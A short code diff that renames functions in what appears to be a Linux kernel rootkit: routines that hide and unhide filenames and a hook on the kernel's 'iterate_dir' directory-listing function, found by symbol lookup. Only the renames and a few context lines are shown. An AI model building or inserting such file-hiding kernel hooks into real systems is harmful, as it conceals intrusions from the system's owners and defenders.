@@ -58,7 +58,7 @@ void vfs_debug(void)
 			pr_debug("\t%s\n", hidden_file[i]);
 }
 
-int hide_filename(const char *name, unsigned int len)
+int vfs_hide_filename(const char *name, unsigned int len)
 {
 	pr_debug("%s: name=%s\n", __func__, name);
 
@@ -75,7 +75,7 @@ int hide_filename(const char *name, unsigned int len)
 	return -1;
 }
 
-int unhide_filename(const char *name, unsigned int len)
+int vfs_unhide_filename(const char *name, unsigned int len)
 {
 	char kname[FILENAME_SIZE];
 
@@ -97,7 +97,7 @@ int unhide_filename(const char *name, unsigned int len)
 	return 0;
 }
 
-void hook_vfs(void)
+void vfs_hook(void)
 {
 	unsigned long iterate_dir_p = get_symbol_addr("iterate_dir");
 
